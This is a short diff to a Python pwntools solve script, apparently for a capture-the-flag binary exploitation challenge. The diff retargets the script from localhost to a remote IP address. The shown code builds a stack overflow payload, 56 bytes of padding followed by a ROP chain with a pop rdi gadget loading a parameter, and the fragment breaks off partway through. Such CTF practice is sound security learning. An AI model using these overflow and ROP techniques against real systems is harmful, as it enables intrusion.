@@ -7,7 +7,9 @@ FLAG_FN = 0x4019bc
 def solve():
     # context.binary = ELF('./flow3')
     # p = process()
-    p = remote("localhost", 2003)
+    ip = "104.248.97.237"
+    # p = remote("localhost", 2003)
+    p = remote(ip, 1346)
     payload = b'A' * 56            # Padding
     payload += p64(POP_RDI)        # pop rdi; ret
     payload += p64(0xdeadc0de)     # value into rdi -> first param
